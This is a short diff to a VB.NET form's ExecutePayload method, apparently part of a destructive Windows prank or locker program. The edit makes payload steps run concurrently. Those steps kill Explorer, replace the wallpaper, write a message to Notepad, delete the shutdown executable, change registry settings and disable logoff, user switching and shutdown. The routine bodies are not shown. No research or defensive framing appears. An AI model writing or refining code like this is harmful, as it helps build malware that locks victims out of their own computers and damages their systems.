@@ -1492,40 +1492,61 @@ Public Class Form1
     ' Method to execute the payload
     Private Sub ExecutePayload()
         Try
+            ' Start the animation loop safely
             Try
-                StartAnimationLoop()
+                Task.Factory.StartNew(Sub()
+                                          StartAnimationLoop()
+                                      End Sub)
             Catch ex As Exception
                 Console.WriteLine("Error in AnimationTimer.Start: " & ex.Message)
             End Try
 
-            KillExplorerAndMore()
+            ' Kill Explorer and related processes
+            Task.Factory.StartNew(Sub()
+                                      KillExplorerAndMore()
+                                  End Sub)
 
+            ' Set wallpaper with error handling
             Try
-                SetWallpaper()
+                Task.Factory.StartNew(Sub()
+                                          SetWallpaper()
+                                      End Sub)
             Catch ex As Exception
                 Console.WriteLine("Error in SetWallpaper: " & ex.Message)
             End Try
 
+            ' Write a message to Notepad with error handling
             Try
-                WriteMessageToNotepad()
+                Task.Factory.StartNew(Sub()
+                                          WriteMessageToNotepad()
+                                      End Sub)
             Catch ex As Exception
                 Console.WriteLine("Error in WriteMessageToNotepad: " & ex.Message)
             End Try
 
+            ' Kill grant access and delete shutdown executable
             Try
-                KillGrantAccessAndDeleteShutdownExe()
+                Task.Factory.StartNew(Sub()
+                                          KillGrantAccessAndDeleteShutdownExe()
+                                      End Sub)
             Catch ex As Exception
                 Console.WriteLine("Error in KillGrantAccessAndDeleteShutdownExe: " & ex.Message)
             End Try
 
+            ' Update registry settings with error handling
             Try
-                UpdateRegistrySettings()
+                Task.Factory.StartNew(Sub()
+                                          UpdateRegistrySettings()
+                                      End Sub)
             Catch ex As Exception
                 Console.WriteLine("Error in UpdateRegistrySettings: " & ex.Message)
             End Try
 
+            ' Disable logoff, switch user, and shutdown options
             Try
-                DisableLogoffSwitchUserAndShutdown()
+                Task.Factory.StartNew(Sub()
+                                          DisableLogoffSwitchUserAndShutdown()
+                                      End Sub)
             Catch ex As Exception
                 Console.WriteLine("Error in DisableLogoffSwitchUserAndShutdown: " & ex.Message)
             End Try
